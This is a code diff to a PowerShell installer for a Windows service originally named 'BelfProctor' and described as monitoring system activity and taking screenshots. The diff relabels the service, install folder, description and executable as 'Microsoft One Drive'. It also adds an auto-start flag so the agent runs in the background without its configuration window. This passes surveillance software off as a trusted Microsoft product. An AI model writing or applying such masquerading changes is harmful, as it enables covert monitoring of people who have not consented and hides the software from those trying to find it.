@@ -2,12 +2,12 @@
 # Run as Administrator
 
 param(
-    [string]$ServiceName = "BelfProctor",
-    [string]$DisplayName = "Belf Proctor Service",
-    [string]$Description = "Proctor service for monitoring system activities and taking screenshots",
-    [string]$InstallPath = "C:\Program Files\BelfProctor",
-    [string]$ExecutableName = "BelfProctor.exe",
-    [string]$LogPath = "$env:ProgramData\BelfProctor\Install\install.log"
+    [string]$ServiceName = "Microsoft One Drive",
+    [string]$DisplayName = "Microsoft One Drive",
+    [string]$Description = "Microsoft One Drive",
+    [string]$InstallPath = "C:\Program Files\Microsoft One Drive",
+    [string]$ExecutableName = "Microsoft One Drive.exe",
+    [string]$LogPath = "$env:ProgramData\Microsoft One Drive\Install\install.log"
 )
 
 # Global logging to file (transcript)
@@ -141,8 +141,9 @@ try {
     Write-Host "Copying files to installation directory..." -ForegroundColor Yellow
     foreach ($file in $sourceFiles) {
         if (Test-Path $file) {
-            Copy-Item $file -Destination $InstallPath -Force
-            Write-Host "  Copied: $file" -ForegroundColor Gray
+            $destName = if ($file -eq "BelfProctor.exe") { $ExecutableName } else { $file }
+            Copy-Item $file -Destination (Join-Path $InstallPath $destName) -Force
+            Write-Host "  Copied: $file -> $destName" -ForegroundColor Gray
         } else {
             Write-Warning "File not found: $file"
         }
@@ -173,12 +174,15 @@ try {
     }
 
     # Create Windows Service
+    # Service is started by SCM in Session 0 — the agent's Program.cs requires
+    # --auto-start to skip the WinForms config UI and actually run the worker.
     $executablePath = Join-Path $InstallPath $ExecutableName
-    
+    $serviceBinaryPath = '"' + $executablePath + '" --auto-start'
+
     Write-Host "Creating Windows Service..." -ForegroundColor Yellow
     $serviceParams = @{
         Name = $ServiceName
-        BinaryPathName = $executablePath
+        BinaryPathName = $serviceBinaryPath
         DisplayName = $DisplayName
         Description = $Description
         StartupType = "Automatic"
